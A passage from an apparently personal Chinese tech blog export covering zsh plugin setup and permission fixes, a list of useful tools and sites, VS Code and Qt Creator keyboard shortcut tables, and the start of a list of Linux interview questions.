<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/zsh-users/zsh-autosuggestions.git $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>

<p>在<code>.zshrc</code>下修改<code>plugins</code>添加插件即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">    zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<h1 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h1><h2 id="进入git目录卡慢的问题"><a href="#进入git目录卡慢的问题" class="headerlink" title="进入git目录卡慢的问题"></a>进入git目录卡慢的问题</h2><p>因为zsh默认加载git各种信息，可以通过配置关闭</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不检测文件改动</span></span><br><span class="line">git config --global --add oh-my-zsh.hide-dirty 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">隐藏所有git信息</span></span><br><span class="line">git config --global --add oh-my-zsh.hide-status 1</span><br></pre></td></tr></table></figure>

<h2 id="目录权限问题"><a href="#目录权限问题" class="headerlink" title="目录权限问题"></a>目录权限问题</h2><p>复制或者更新zsh，重启可能会出现以下报错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[oh-my-zsh] Insecure completion-dependent directories detected:</span><br><span class="line">drwxrwxrwx 1 ***** ***** 512 Oct 25 13:51 /home/*****/.oh-my-zsh/custom/plugins</span><br><span class="line">drwxrwxrwx 1 ***** ***** 512 Oct 25 13:49 /home/*****/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting</span><br><span class="line"></span><br><span class="line">[oh-my-zsh] For safety, we will not load completions from these directories until</span><br><span class="line">[oh-my-zsh] you fix their permissions and ownership and restart zsh.</span><br><span class="line">[oh-my-zsh] See the above list for directories with group or other writability.</span><br><span class="line"></span><br><span class="line">[oh-my-zsh] To fix your permissions you can do so by disabling</span><br><span class="line">[oh-my-zsh] the write permission of &quot;group&quot; and &quot;others&quot; and making sure that the</span><br><span class="line">[oh-my-zsh] owner of these directories is either root or your current user.</span><br><span class="line">[oh-my-zsh] The following command may help:</span><br><span class="line">[oh-my-zsh]     compaudit | xargs chmod g-w,o-w</span><br><span class="line"></span><br><span class="line">[oh-my-zsh] If the above didn&#x27;t help or you want to skip the verification of</span><br><span class="line">[oh-my-zsh] insecure directories you can set the variable ZSH_DISABLE_COMPFIX to</span><br><span class="line">[oh-my-zsh] &quot;true&quot; before oh-my-zsh is sourced in your zshrc file.</span><br></pre></td></tr></table></figure>

<p>添加一下权限即可</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 755 /home/*****/.oh-my-zsh/custom/plugins</span><br><span class="line">chmod 755 /home/*****/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>资源整理</title>
    <url>/blogs/2018-10-16-resource/</url>
    <content><![CDATA[<h1 id="一、工作资源"><a href="#一、工作资源" class="headerlink" title="一、工作资源"></a>一、工作资源</h1><ul>
<li>私有远程git仓库: <a href="https://bitbucket.org/">Bitbucket</a>、<a href="https://about.gitlab.com/">Gitlab</a></li>
<li>可以做本地项目管理的git服务器框架: <a href="https://about.gitlab.com/">Gitlab</a></li>
<li>各类文档模板: <a href="http://www.officeplus.cn/Template/Home.shtml">Office Plus</a></li>
<li>内网穿透转发工具: <a href="https://www.ngrok.cc/">Sunny ngrok</a></li>
<li>微软相关API文档(可以查询WindowsAPI): <a href="https://msdn.microsoft.com/library/">MSDN</a></li>
<li>代理转发，负载均衡的: <a href="https://www.servicemesher.com/envoy/intro/what_is_envoy.html">envoy</a>、nginx</li>
<li>在线画结构图等: <a href="https://app.diagrams.net/">diagrams</a></li>
<li>内网论坛系统: <a href="https://www.discourse.org/">discourse</a>, <a href="https://github.com/discourse/discourse">github链接</a></li>
</ul>
<h1 id="二、工具资源"><a href="#二、工具资源" class="headerlink" title="二、工具资源"></a>二、工具资源</h1><h2 id="1-平台通用"><a href="#1-平台通用" class="headerlink" title="1. 平台通用"></a>1. 平台通用</h2><ul>
<li>翻墙软件: <a href="https://github.com/search?q=shadowsocks">Shadowsocks</a><ul>
<li>一个比较好的shadowsocks服务器更新网址: <a href="https://github.com/Alvin9999/new-pac/wiki/ss%E5%85%8D%E8%B4%B9%E8%B4%A6%E5%8F%B7">ss服务器</a></li>
</ul>
</li>
<li>文本编辑器: <a href="https://code.visualstudio.com/">Visual Studio Code</a>、<a href="http://www.sublimetext.com/">sublime text</a></li>
<li>论文编写latex软件: <a href="http://tug.org/texlive/">texlive</a></li>
<li>思维导图: <a href="https://www.xmind.net/">XMind</a></li>
<li>U盘iso安装系统（可以一个U盘做多个系统的启动盘）: ventory</li>
<li>跨平台共享键盘鼠标: synergy</li>
<li>在线文件传输: 文叔叔、<a href="https://airportal.cn/">文件空投</a></li>
<li>idea激活码: <a href="https://ideas.zngue.com/detail/9367.html">https://ideas.zngue.com/detail/9367.html</a></li>
<li>域名访问不了，在网站上直接找域名对应ip加入hosts: <a href="https://ipaddress.com/">https://ipaddress.com</a><ul>
<li><a href="https://ip.tool.chinaz.com/">https://ip.tool.chinaz.com/</a></li>
</ul>
</li>
<li>后台管理界面开源项目: <a href="https://github.com/zhongshaofa/layuimini">https://github.com/zhongshaofa/layuimini</a></li>
<li>超级方便的快速索引直达软件: <a href="https://u.tools/">Utools</a><ul>
<li>插件离线下载：<a href="https://api.u-tools.cn/Plugins/Developer/allPlugins">allPlugins</a></li>
</ul>
</li>
</ul>
<h2 id="2-windows"><a href="#2-windows" class="headerlink" title="2. windows"></a>2. windows</h2><ul>
<li>微软原版系统下载: <a href="https://msdn.itellyou.cn/">MSDN，我告诉你</a></li>
<li>自定义鼠标动作工具: <a href="https://x-mouse-button-control.en.softonic.com/">X-Mouse</a></li>
<li>Windows下的linux小系统图形化显示界面工具: <a href="https://sourceforge.net/projects/xming/">XMing</a></li>
<li>Windows下超好用的截屏软件: <a href="https://zh.snipaste.com/download.html">snipaste</a></li>
<li>进程查看，调用和dll库等: <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">process explorer</a></li>
<li>openssl安装包: <a href="https://oomake.com/download/openssl">码客 openssl官方下载</a></li>
<li>网络加时延阻塞工具: <a href="https://github.com/jagt/clumsy">clumsy</a></li>
</ul>
<h2 id="3-linux"><a href="#3-linux" class="headerlink" title="3. linux"></a>3. linux</h2><ul>
<li>漂亮且好用的shell主题: <a href="/pages/2018-10-25-zshConfig/">zsh</a></li>
<li>分屏操作工具: <a href="(/pages/2018-09-16-shellStudy/#tmux)">tmux</a></li>
<li>linux下snipaste替代方案: flameshot</li>
<li>linux下tortoissvn替代方案: rabbitvcs</li>
<li>beyondcompare替代方案: meld</li>
<li>linux命令行查看图片的工具: viu</li>
<li>ntp时间同步工具: ntpdate</li>
<li>多线程下载工具: axel</li>
<li>清理软件: stacer</li>
</ul>
<h1 id="三、下载资源"><a href="#三、下载资源" class="headerlink" title="三、下载资源"></a>三、下载资源</h1><h2 id="1-加速镜像站"><a href="#1-加速镜像站" class="headerlink" title="1. 加速镜像站"></a>1. 加速镜像站</h2><ul>
<li><a href="https://www.cnblogs.com/july-sunny/p/13697156.html">加速github访问下载的9种方案</a></li>
<li><a href="https://ghproxy.com/">github proxy</a></li>
</ul>
<h2 id="2-software"><a href="#2-software" class="headerlink" title="2. software"></a>2. software</h2><ul>
<li>跨平台C++应用开发框架: <a href="http://download.qt.io/archive/qt/">Qt</a></li>
<li>keil的硬件支持包: <a href="http://www.keil.com/dd2/Pack/">MDK5 Software Packs</a></li>
</ul>
<h1 id="学习资源"><a href="#学习资源" class="headerlink" title="学习资源"></a>学习资源</h1><h2 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h2><ul>
<li>机器学习比赛网站: <a href="https://www.kaggle.com/">Kaggle</a></li>
<li>手写数字的数据集: MNIST数据集</li>
<li>一个好的tensorflow官方文档: <a href="https://www.w3cschool.cn/tensorflow_python/">W3Cschool</a></li>
<li>零基础入门深度学习博客: <a href="https://www.zybuluo.com/hanbingtao/note/433855">零基础入门深度学习</a></li>
</ul>
<h2 id="视频制作"><a href="#视频制作" class="headerlink" title="视频制作"></a>视频制作</h2><ul>
<li>视频特效学习网站: <a href="https://www.vmovier.com/series/45/1?from=series_post_intro">电影自习室</a></li>
</ul>
]]></content>
      <categories>
        <category>Work</category>
      </categories>
  </entry>
  <entry>
    <title>快捷键记录</title>
    <url>/blogs/2018-10-16-shortcuts/</url>
    <content><![CDATA[<h1 id="默认快捷键"><a href="#默认快捷键" class="headerlink" title="默认快捷键"></a>默认快捷键</h1><h2 id="文本基础快捷键"><a href="#文本基础快捷键" class="headerlink" title="文本基础快捷键"></a>文本基础快捷键</h2><table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl + Shift + End</td>
<td>当前位置向后全选</td>
</tr>
<tr>
<td>Alt + &lt;左右方向键&gt;</td>
<td>跳转一个单词</td>
</tr>
</tbody></table>
<h1 id="软件快捷键"><a href="#软件快捷键" class="headerlink" title="软件快捷键"></a>软件快捷键</h1><h2 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h2><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl + Shift + P，F1</td>
<td>显示命令面板 Show Command Palette</td>
</tr>
<tr>
<td>Ctrl + P</td>
<td>快速打开 Quick Open</td>
</tr>
<tr>
<td>Ctrl + Shift + N</td>
<td>新窗口&#x2F;实例 New window&#x2F;instance</td>
</tr>
<tr>
<td>Ctrl + Shift + W</td>
<td>关闭窗口&#x2F;实例 Close window&#x2F;instance</td>
</tr>
</tbody></table>
<h3 id="基础编辑-Basic-editing"><a href="#基础编辑-Basic-editing" class="headerlink" title="基础编辑 Basic editing"></a>基础编辑 Basic editing</h3><table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl+X</td>
<td>剪切行（空选定） Cut line (empty selection)</td>
</tr>
<tr>
<td>Ctrl+C</td>
<td>复制行（空选定）Copy line (empty selection)</td>
</tr>
<tr>
<td>Alt+ ↑ &#x2F; ↓</td>
<td>向上&#x2F;向下移动行 Move line up&#x2F;down</td>
</tr>
<tr>
<td>Shift+Alt + ↓ &#x2F; ↑</td>
<td>向上&#x2F;向下复制行 Copy line up&#x2F;down</td>
</tr>
<tr>
<td>Ctrl+Shift+K</td>
<td>删除行 Delete line</td>
</tr>
<tr>
<td>Ctrl+Enter</td>
<td>在下面插入行 Insert line below</td>
</tr>
<tr>
<td>Ctrl+Shift+Enter</td>
<td>在上面插入行 Insert line above</td>
</tr>
<tr>
<td>Ctrl+Shift+\</td>
<td>跳到匹配的括号 Jump to matching bracket</td>
</tr>
<tr>
<td>Ctrl+] &#x2F; [</td>
<td>缩进&#x2F;缩进行 Indent&#x2F;outdent line</td>
</tr>
<tr>
<td>Home</td>
<td>转到行首 Go to beginning of line</td>
</tr>
<tr>
<td>End</td>
<td>转到行尾 Go to end of line</td>
</tr>
<tr>
<td>Ctrl+Home</td>
<td>转到文件开头 Go to beginning of file</td>
</tr>
<tr>
<td>Ctrl+End</td>
<td>转到文件末尾 Go to end of file</td>
</tr>
<tr>
<td>Ctrl+↑ &#x2F; ↓</td>
<td>向上&#x2F;向下滚动行 Scroll line up&#x2F;down</td>
</tr>
<tr>
<td>Alt+PgUp &#x2F; PgDown</td>
<td>向上&#x2F;向下滚动页面 Scroll page up&#x2F;down</td>
</tr>
<tr>
<td>Ctrl+Shift+[</td>
<td>折叠（折叠）区域 Fold (collapse) region</td>
</tr>
<tr>
<td>Ctrl+Shift+]</td>
<td>展开（未折叠）区域 Unfold (uncollapse) region</td>
</tr>
<tr>
<td>Ctrl+K Ctrl+[</td>
<td>折叠（未折叠）所有子区域 Fold (collapse) all subregions</td>
</tr>
<tr>
<td>Ctrl+K Ctrl+]</td>
<td>展开（未折叠）所有子区域 Unfold (uncollapse) all subregions</td>
</tr>
<tr>
<td>Ctrl+K Ctrl+0</td>
<td>折叠（折叠）所有区域 Fold (collapse) all regions</td>
</tr>
<tr>
<td>Ctrl+K Ctrl+J</td>
<td>展开（未折叠）所有区域 Unfold (uncollapse) all regions</td>
</tr>
<tr>
<td>Ctrl+K Ctrl+C</td>
<td>添加行注释 Add line comment</td>
</tr>
<tr>
<td>Ctrl+K Ctrl+U</td>
<td>删除行注释 Remove line comment</td>
</tr>
<tr>
<td>Ctrl+&#x2F;</td>
<td>切换行注释 Toggle line comment</td>
</tr>
<tr>
<td>Shift+Alt+A</td>
<td>切换块注释 Toggle block comment</td>
</tr>
<tr>
<td>Alt+Z</td>
<td>切换换行 Toggle word wrap</td>
</tr>
</tbody></table>
<h3 id="导航-Navigation"><a href="#导航-Navigation" class="headerlink" title="导航 Navigation"></a>导航 Navigation</h3><table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl + T</td>
<td>显示所有符号 Show all Symbols</td>
</tr>
<tr>
<td>Ctrl + G</td>
<td>转到行… Go to Line…</td>
</tr>
<tr>
<td>Ctrl + P</td>
<td>转到文件… Go to File…</td>
</tr>
<tr>
<td>Ctrl + Shift + O</td>
<td>转到符号… Go to Symbol…</td>
</tr>
<tr>
<td>Ctrl + Shift + M</td>
<td>显示问题面板 Show Problems panel</td>
</tr>
<tr>
<td>F8</td>
<td>转到下一个错误或警告 Go to next error or warning</td>
</tr>
<tr>
<td>Shift + F8</td>
<td>转到上一个错误或警告 Go to previous error or warning</td>
</tr>
<tr>
<td>Ctrl + Shift + Tab</td>
<td>导航编辑器组历史记录 Navigate editor group history</td>
</tr>
<tr>
<td>Alt + ←&#x2F;→</td>
<td>返回&#x2F;前进 Go back &#x2F; forward</td>
</tr>
<tr>
<td>Ctrl + M</td>
<td>切换选项卡移动焦点 Toggle Tab moves focus</td>
</tr>
</tbody></table>
<h3 id="搜索和替换-Search-and-replace"><a href="#搜索和替换-Search-and-replace" class="headerlink" title="搜索和替换 Search and replace"></a>搜索和替换 Search and replace</h3><table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl + F</td>
<td>查找 Find</td>
</tr>
<tr>
<td>Ctrl + H</td>
<td>替换 Replace</td>
</tr>
<tr>
<td>F3 &#x2F; Shift + F3</td>
<td>查找下一个&#x2F;上一个 Find next&#x2F;previous</td>
</tr>
<tr>
<td>Alt + Enter</td>
<td>选择查找匹配的所有出现 Select all occurences of Find match</td>
</tr>
<tr>
<td>Ctrl + D</td>
<td>将选择添加到下一个查找匹配 Add selection to next Find match</td>
</tr>
<tr>
<td>Ctrl + K Ctrl + D</td>
<td>将最后一个选择移至下一个查找匹配项 Move last selection to next Find match</td>
</tr>
<tr>
<td>Alt + C &#x2F; R &#x2F; W</td>
<td>切换区分大小写&#x2F;正则表达式&#x2F;整个词 Toggle case-sensitive &#x2F; regex &#x2F; whole word</td>
</tr>
</tbody></table>
<h3 id="多光标和选择-Multi-cursor-and-selection"><a href="#多光标和选择-Multi-cursor-and-selection" class="headerlink" title="多光标和选择 Multi-cursor and selection"></a>多光标和选择 Multi-cursor and selection</h3><table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Alt +单击</td>
<td>插入光标 Insert cursor</td>
</tr>
<tr>
<td>Ctrl + Alt +↑&#x2F;↓</td>
<td>在上&#x2F;下插入光标 Insert cursor above &#x2F; below</td>
</tr>
<tr>
<td>Ctrl + U</td>
<td>撤消上一个光标操作 Undo last cursor operation</td>
</tr>
<tr>
<td>Shift + Alt + I</td>
<td>在选定的每一行的末尾插入光标 Insert cursor at end of each line selected</td>
</tr>
<tr>
<td>Ctrl + I</td>
<td>选择当前行 Select current line</td>
</tr>
<tr>
<td>Ctrl + Shift + L</td>
<td>选择当前选择的所有出现 Select all occurrences of current selection</td>
</tr>
<tr>
<td>Ctrl + F2</td>
<td>选择当前字的所有出现 Select all occurrences of current word</td>
</tr>
<tr>
<td>Shift + Alt + →</td>
<td>展开选择 Expand selection</td>
</tr>
<tr>
<td>Shift + Alt + ←</td>
<td>缩小选择 Shrink selection</td>
</tr>
<tr>
<td>Shift + Alt + （拖动鼠标）</td>
<td>列（框）选择 Column (box) selection</td>
</tr>
<tr>
<td>Ctrl + Shift + Alt +（箭头键）</td>
<td>列（框）选择 Column (box) selection</td>
</tr>
<tr>
<td>Ctrl + Shift + Alt + PgUp &#x2F; PgDown</td>
<td>列（框）选择页上&#x2F;下 Column (box) selection page up&#x2F;down</td>
</tr>
</tbody></table>
<h3 id="丰富的语言编辑-Rich-languages-editing"><a href="#丰富的语言编辑-Rich-languages-editing" class="headerlink" title="丰富的语言编辑 Rich languages editing"></a>丰富的语言编辑 Rich languages editing</h3><table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl + 空格</td>
<td>触发建议 Trigger suggestion</td>
</tr>
<tr>
<td>Ctrl + Shift + Space</td>
<td>触发器参数提示 Trigger parameter hints</td>
</tr>
<tr>
<td>Tab</td>
<td>Emmet展开缩写 Emmet expand abbreviation</td>
</tr>
<tr>
<td>Shift + Alt + F</td>
<td>格式化文档 Format document</td>
</tr>
<tr>
<td>Ctrl + K Ctrl + F</td>
<td>格式选定区域 Format selection</td>
</tr>
<tr>
<td>F12</td>
<td>转到定义 Go to Definition</td>
</tr>
<tr>
<td>Alt + F12</td>
<td>Peek定义 Peek Definition</td>
</tr>
<tr>
<td>Ctrl + K F12</td>
<td>打开定义到边 Open Definition to the side</td>
</tr>
<tr>
<td>Ctrl + .</td>
<td>快速解决 Quick Fix</td>
</tr>
<tr>
<td>Shift + F12</td>
<td>显示引用 Show References</td>
</tr>
<tr>
<td>F2</td>
<td>重命名符号 Rename Symbol</td>
</tr>
<tr>
<td>Ctrl + Shift + . &#x2F;，</td>
<td>替换为下一个&#x2F;上一个值 Replace with next&#x2F;previous value</td>
</tr>
<tr>
<td>Ctrl + K Ctrl + X</td>
<td>修剪尾随空格 Trim trailing whitespace</td>
</tr>
<tr>
<td>Ctrl + K M</td>
<td>更改文件语言 Change file language</td>
</tr>
<tr>
<td>编辑器管理 Editor management</td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl+F4, Ctrl+W</td>
<td>关闭编辑器 Close editor</td>
</tr>
<tr>
<td>Ctrl+K F</td>
<td>关闭文件夹 Close folder</td>
</tr>
<tr>
<td>Ctrl+\</td>
<td>拆分编辑器 Split editor</td>
</tr>
<tr>
<td>Ctrl+ 1 &#x2F; 2 &#x2F; 3</td>
<td>聚焦到第1，第2或第3编辑器组 Focus into 1st, 2nd or 3rd editor group</td>
</tr>
<tr>
<td>Ctrl+K Ctrl+ ←&#x2F;→</td>
<td>聚焦到上一个&#x2F;下一个编辑器组 Focus into previous&#x2F;next editor group</td>
</tr>
<tr>
<td>Ctrl+Shift+PgUp &#x2F; PgDown</td>
<td>向左&#x2F;向右移动编辑器 Move editor left&#x2F;right</td>
</tr>
<tr>
<td>Ctrl+K ← &#x2F; →</td>
<td>移动活动编辑器组 Move active editor group</td>
</tr>
</tbody></table>
<h3 id="文件管理-File-management"><a href="#文件管理-File-management" class="headerlink" title="文件管理 File management"></a>文件管理 File management</h3><table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl+N</td>
<td>新文件 New File</td>
</tr>
<tr>
<td>Ctrl+O</td>
<td>打开文件… Open File…</td>
</tr>
<tr>
<td>Ctrl+S</td>
<td>保存 Save</td>
</tr>
<tr>
<td>Ctrl+Shift+S</td>
<td>另存为… Save As…</td>
</tr>
<tr>
<td>Ctrl+K S</td>
<td>全部保存 Save All</td>
</tr>
<tr>
<td>Ctrl+F4</td>
<td>关闭 Close</td>
</tr>
<tr>
<td>Ctrl+K Ctrl+W</td>
<td>关闭所有 Close All</td>
</tr>
<tr>
<td>Ctrl+Shift+T</td>
<td>重新打开关闭的编辑器 Reopen closed editor</td>
</tr>
<tr>
<td>Ctrl+K</td>
<td>输入保持打开 Enter Keep Open</td>
</tr>
<tr>
<td>Ctrl+Tab</td>
<td>打开下一个 Open next</td>
</tr>
<tr>
<td>Ctrl+Shift+Tab</td>
<td>打开上一个 Open previous</td>
</tr>
<tr>
<td>Ctrl+K P</td>
<td>复制活动文件的路径 Copy path of active file</td>
</tr>
<tr>
<td>Ctrl+K R</td>
<td>显示资源管理器中的活动文件 Reveal active file in Explorer</td>
</tr>
<tr>
<td>Ctrl+K O</td>
<td>显示新窗口&#x2F;实例中的活动文件 Show active file in new window&#x2F;instance</td>
</tr>
</tbody></table>
<h3 id="显示-Display"><a href="#显示-Display" class="headerlink" title="显示 Display"></a>显示 Display</h3><table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>F11</td>
<td>切换全屏 Toggle full screen</td>
</tr>
<tr>
<td>Shift+Alt+1</td>
<td>切换编辑器布局 Toggle editor layout</td>
</tr>
<tr>
<td>Ctrl+ &#x3D; &#x2F; -</td>
<td>放大&#x2F;缩小 Zoom in&#x2F;out</td>
</tr>
<tr>
<td>Ctrl+B</td>
<td>切换侧栏可见性 Toggle Sidebar visibility</td>
</tr>
<tr>
<td>Ctrl+Shift+E</td>
<td>显示浏览器&#x2F;切换焦点 Show Explorer &#x2F; Toggle focus</td>
</tr>
<tr>
<td>Ctrl+Shift+F</td>
<td>显示搜索 Show Search</td>
</tr>
<tr>
<td>Ctrl+Shift+G</td>
<td>显示Git Show Git</td>
</tr>
<tr>
<td>Ctrl+Shift+D</td>
<td>显示调试 Show Debug</td>
</tr>
<tr>
<td>Ctrl+Shift+X</td>
<td>显示扩展 Show Extensions</td>
</tr>
<tr>
<td>Ctrl+Shift+H</td>
<td>替换文件 Replace in files</td>
</tr>
<tr>
<td>Ctrl+Shift+J</td>
<td>切换搜索详细信息 Toggle Search details</td>
</tr>
<tr>
<td>Ctrl+Shift+C</td>
<td>打开新命令提示符&#x2F;终端 Open new command prompt&#x2F;terminal</td>
</tr>
<tr>
<td>Ctrl+Shift+U</td>
<td>显示输出面板 Show Output panel</td>
</tr>
<tr>
<td>Ctrl+Shift+V</td>
<td>切换Markdown预览 Toggle Markdown preview</td>
</tr>
<tr>
<td>Ctrl+K V</td>
<td>从旁边打开Markdown预览 Open Markdown preview to the side</td>
</tr>
</tbody></table>
<h3 id="调试-Debug"><a href="#调试-Debug" class="headerlink" title="调试 Debug"></a>调试 Debug</h3><table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>F9</td>
<td>切换断点 Toggle breakpoint</td>
</tr>
<tr>
<td>F5</td>
<td>开始&#x2F;继续 Start&#x2F;Continue</td>
</tr>
<tr>
<td>Shift+F5</td>
<td>停止 Stop</td>
</tr>
<tr>
<td>F11 &#x2F; Shift+F11</td>
<td>下一步&#x2F;上一步 Step into&#x2F;out</td>
</tr>
<tr>
<td>F10</td>
<td>跳过 Step over</td>
</tr>
<tr>
<td>Ctrl+K Ctrl+I</td>
<td>显示悬停 Show hover</td>
</tr>
</tbody></table>
<h3 id="集成终端-Integrated-terminal"><a href="#集成终端-Integrated-terminal" class="headerlink" title="集成终端 Integrated terminal"></a>集成终端 Integrated terminal</h3><table>
<thead>
<tr>
<th>按键</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>Ctrl+&#96;</td>
<td>显示集成终端 Show integrated terminal</td>
</tr>
<tr>
<td>Ctrl+Shift+&#96;</td>
<td>创建新终端 Create new terminal</td>
</tr>
<tr>
<td>Ctrl+Shift+C</td>
<td>复制选定 Copy selection</td>
</tr>
<tr>
<td>Ctrl+Shift+V</td>
<td>粘贴到活动端子 Paste into active terminal</td>
</tr>
<tr>
<td>Ctrl+↑ &#x2F; ↓</td>
<td>向上&#x2F;向下滚动 Scroll up&#x2F;down</td>
</tr>
<tr>
<td>Shift+PgUp &#x2F; PgDown</td>
<td>向上&#x2F;向下滚动页面 Scroll page up&#x2F;down</td>
</tr>
<tr>
<td>Ctrl+Home &#x2F; End</td>
<td>滚动到顶部&#x2F;底部 Scroll to top&#x2F;bottom</td>
</tr>
</tbody></table>
<h2 id="Qt"><a href="#Qt" class="headerlink" title="Qt"></a>Qt</h2><table>
<thead>
<tr>
<th>键值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>F1</td>
<td>查看帮助</td>
</tr>
<tr>
<td>F2</td>
<td>跳转到函数定义（和Ctrl+鼠标左键一样的效果）</td>
</tr>
<tr>
<td>Shift+F2</td>
<td>声明和定义之间切换</td>
</tr>
<tr>
<td>F4</td>
<td>头文件和源文件之间切换</td>
</tr>
<tr>
<td>Ctrl+1</td>
<td>欢迎模式</td>
</tr>
<tr>
<td>Ctrl+2</td>
<td>编辑模式</td>
</tr>
<tr>
<td>Ctrl+3</td>
<td>调试模式</td>
</tr>
<tr>
<td>Ctrl+4</td>
<td>项目设置模式</td>
</tr>
<tr>
<td>Ctrl+5</td>
<td>帮助模式</td>
</tr>
<tr>
<td>Ctrl+6</td>
<td>输出模式</td>
</tr>
<tr>
<td>Alt+0</td>
<td>显示或者隐藏侧边条，编辑模式下起作用（有时写的函数太长，屏幕不够大，就用这个）</td>
</tr>
<tr>
<td>Ctrl+Space</td>
<td>自动补全（貌似会和输入法的切换冲突）</td>
</tr>
<tr>
<td>ESc</td>
<td>切换到编辑模式</td>
</tr>
<tr>
<td>Alt+1</td>
<td>创建细节窗口</td>
</tr>
<tr>
<td>Alt+2</td>
<td>搜索结果窗口</td>
</tr>
<tr>
<td>Alt+3</td>
<td>程序输出窗口</td>
</tr>
<tr>
<td>Alt+4</td>
<td>编译输出窗口</td>
</tr>
<tr>
<td>Ctrl+B</td>
<td>编译工程</td>
</tr>
<tr>
<td>Ctrl+R</td>
<td>运行工程</td>
</tr>
<tr>
<td>Ctrl+I</td>
<td>自动对齐</td>
</tr>
<tr>
<td>Ctrl+&#x2F;</td>
<td>注释行，取消注释行</td>
</tr>
<tr>
<td>Ctrl+Shift+&lt;</td>
<td>折叠代码块</td>
</tr>
<tr>
<td>Ctrl+Shift+&gt;</td>
<td>展开代码块</td>
</tr>
<tr>
<td>Ctrl+[</td>
<td>跳到代码块的头部</td>
</tr>
<tr>
<td>Ctrl+]</td>
<td>跳到代码块的尾部</td>
</tr>
<tr>
<td>Ctrl+L</td>
<td>跳到某一行</td>
</tr>
<tr>
<td>Ctrl+F</td>
<td>查找替换当前选中的内容，按下Ctrl+F，会列出所有和你选的内容一样的语句</td>
</tr>
<tr>
<td>Ctrl+Shift+F</td>
<td>查找内容</td>
</tr>
<tr>
<td>F5</td>
<td>开始调试</td>
</tr>
<tr>
<td>Shift+F5</td>
<td>停止调试</td>
</tr>
<tr>
<td>F9</td>
<td>设置和取消断点</td>
</tr>
<tr>
<td>F10</td>
<td>单步前进</td>
</tr>
<tr>
<td>F11</td>
<td>单步进入函数</td>
</tr>
<tr>
<td>Shift + F11</td>
<td>单步跳出函数</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Software Usage</category>
        <category>Shortcut</category>
      </categories>
  </entry>
  <entry>
    <title>面试可以问的问题</title>
    <url>/blogs/2018-10-10-interviewQuestion/</url>
    <content><![CDATA[<h1 id="一、性格"><a href="#一、性格" class="headerlink" title="一、性格"></a>一、性格</h1><ol>
<li>介绍一下自己</li>
<li>被刷了怎么办</li>
<li>以后的打算</li>
</ol>
<h1 id="二、技术"><a href="#二、技术" class="headerlink" title="二、技术"></a>二、技术</h1><ol>
<li>如何学习一门新的语言<ul>
<li>记笔记</li>
<li>做实践</li>
</ul>
</li>
<li>做过什么项目，担任什么工作，怎么做<ul>
<li>对于项目的架构的了解</li>
<li>是不是水</li>
</ul>
</li>
<li>遇到技术问题怎么办</li>
</ol>
<h2 id="1-linux"><a href="#1-linux" class="headerlink" title="1. linux"></a>1. linux</h2><h3 id="1-1-IO"><a href="#1-1-IO" class="headerlink" title="1.1. IO"></a>1.1. IO</h3><ol>
<li>Linux 的 system I&#x2F;O 和 std I&#x2F;O 有什么区别？各自的效率怎样？<ul>
<li>system io，read&#x2F;write</li>
<li>std io，fread&#x2F;fwrite</li>
</ul>
</li>
<li>linux下的io多路复用有几种方式？ 各自有什么优缺点？（提问：水平触发和电平触发的区别）<ul>
<li>select&#x2F;epoll</li>
</ul>
</li>
</ol>
<h3 id="1-2-命令执行"><a href="#1-2-命令执行" class="headerlink" title="1.2. 命令执行"></a>1.2. 命令执行</h3><p>Shell命令执行结果通常包含哪些，（返回值0或非0，标准输出和标准出错的信息），在其它语言（例如C）中如何才能正确获取所有的命令执行结果，提高程序的用可用性和可查错性（c可自行封装函数捕捉标准输出和标准出错，其它语言可以用类似功能的api，反正system函数不是个好选择）</p>
<h3 id="1-3-命令"><a href="#1-3-命令" class="headerlink" title="1.3. 命令"></a>1.3. 命令</h3><ol>
<li>尽量多的说出linux常用命令</li>
<li>怎么查看端口占用情况<br> 2.netstat -anp | grep [port] 或者用lsof -i:[port]</li>
